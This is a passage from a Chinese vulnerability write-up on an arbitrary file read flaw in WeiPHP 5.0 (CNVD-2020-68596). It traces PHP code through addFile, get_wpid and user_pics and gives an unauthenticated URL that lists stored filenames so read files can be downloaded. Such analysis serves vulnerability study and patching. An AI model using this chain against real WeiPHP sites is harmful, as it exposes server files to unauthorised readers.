+        data-srcset="/images/202205181602698.png, /images/202205181602698.png 1.5x, /images/202205181602698.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181602698.png"
+        title="image-20220518160204626" /></p>
+<p>在当前条件下并不知道文件名是什么，所以回到代码中继续寻找可以获取文件名的办法</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181602112.png"
+        data-srcset="/images/202205181602112.png, /images/202205181602112.png 1.5x, /images/202205181602112.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181602112.png"
+        title="image-20220518160225049" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if ($res) {
+</span></span><span class="line"><span class="cl">            $file = array(
+</span></span><span class="line"><span class="cl">                &#39;name&#39; =&gt; $picName,
+</span></span><span class="line"><span class="cl">                &#39;type&#39; =&gt; &#39;application/octet-stream&#39;,
+</span></span><span class="line"><span class="cl">                &#39;tmp_name&#39; =&gt; $picPath,
+</span></span><span class="line"><span class="cl">                &#39;size&#39; =&gt; $res,
+</span></span><span class="line"><span class="cl">                &#39;error&#39; =&gt; 0
+</span></span><span class="line"><span class="cl">            );
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            $File = D(&#39;home/Picture&#39;);
+</span></span><span class="line"><span class="cl">            $cover_id = $File-&gt;addFile($file);
+</span></span><span class="line"><span class="cl">        }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>向下跟进 <code>addFile</code> 函数</p>
+<p>函数位置:<code>application\home\model\Picture.php</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181602963.png"
+        data-srcset="/images/202205181602963.png, /images/202205181602963.png 1.5x, /images/202205181602963.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181602963.png"
+        title="image-20220518160239897" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function addFile($file)
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        $data[&#39;md5&#39;] = md5_file($file[&#39;tmp_name&#39;]);
+</span></span><span class="line"><span class="cl">        $id = $this-&gt;where(&#39;md5&#39;, $data[&#39;md5&#39;])-&gt;value(&#39;id&#39;);
+</span></span><span class="line"><span class="cl">        if ($id &gt; 0) {
+</span></span><span class="line"><span class="cl">            return $id;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        $info = pathinfo($file[&#39;tmp_name&#39;]);
+</span></span><span class="line"><span class="cl">        $data[&#39;path&#39;] = str_replace(SITE_PATH . &#39;/public&#39;, &#39;&#39;, $file[&#39;tmp_name&#39;]);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        $data[&#39;sha1&#39;] = hash_file(&#39;sha1&#39;, $file[&#39;tmp_name&#39;]);
+</span></span><span class="line"><span class="cl">        $data[&#39;create_time&#39;] = NOW_TIME;
+</span></span><span class="line"><span class="cl">        $data[&#39;status&#39;] = 1;
+</span></span><span class="line"><span class="cl">        $data[&#39;wpid&#39;] = get_wpid();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        $id = $this-&gt;insertGetId($data);
+</span></span><span class="line"><span class="cl">        return $id;
+</span></span><span class="line"><span class="cl">    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到这部分代码写入了 Picture 表中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$id = $this-&gt;insertGetId($data);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们查看一下数据库的这个数据表，可以发现之前所上传的数据全部缓存在这个表里了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181602824.png"
+        data-srcset="/images/202205181602824.png, /images/202205181602824.png 1.5x, /images/202205181602824.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181602824.png"
+        title="image-20220518160254667" /></p>
+<p>我们现在则需要找到不需要登录的地方来获得这些数据，所以可以全局去查找调用了这个 Picture 表的地方</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181603655.png"
+        data-srcset="/images/202205181603655.png, /images/202205181603655.png 1.5x, /images/202205181603655.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181603655.png"
+        title="image-20220518160312578" /></p>
+<p>找到一处可以利用的地方</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function user_pics()
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        $map[&#39;wpid&#39;] = get_wpid();
+</span></span><span class="line"><span class="cl">        $picList = M(&#39;Picture&#39;)-&gt;where(wp_where($map))
+</span></span><span class="line"><span class="cl">            -&gt;order(&#39;id desc&#39;)
+</span></span><span class="line"><span class="cl">            -&gt;select();
+</span></span><span class="line"><span class="cl">        $this-&gt;assign(&#39;picList&#39;, $picList);
+</span></span><span class="line"><span class="cl">        exit($this-&gt;fetch());
+</span></span><span class="line"><span class="cl">    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>跟进 <code>get_wpid</code> 函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function get_wpid($wpid = &#39;&#39;)
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    if (defined(&#39;WPID&#39;)) {
+</span></span><span class="line"><span class="cl">        return WPID;
+</span></span><span class="line"><span class="cl">    } else {
+</span></span><span class="line"><span class="cl">        return 0;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看 WPID 的定义，文件位置在<code>config\weiphp_define.php</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181603854.png"
+        data-srcset="/images/202205181603854.png, /images/202205181603854.png 1.5x, /images/202205181603854.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181603854.png"
+        title="image-20220518160335575" /></p>
+<p>定义值默认为 1，所以这里调用则可以获得数据库中Pictrue表的内容，间接的知道了文件内容以及文件名</p>
+<p>访问地址: http://webphp/public/index.php/home/file/user_pids</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202205181604752.png"
+        data-srcset="/images/202205181604752.png, /images/202205181604752.png 1.5x, /images/202205181604752.png 2x"
+        data-sizes="auto"
+        alt="/images/202205181604752.png"
+        title="image-20220518160401674" /></p>
+<p>可以看到文件名，根据url地址访问选择下载即可</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/" data-title="WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/" data-title="WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/" data-title="WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/" data-title="WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/" class="prev" rel="prev" title="WeiPHP5.0 任意用户Cookie伪造 CNVD-2021-09693"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>WeiPHP5.0 任意用户Cookie伪造 CNVD-2021-09693</a>
+            <a href="/weiphp5.0-bind_follow-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="WeiPHP5.0 bind_follow SQL注入漏洞">WeiPHP5.0 bind_follow SQL注入漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
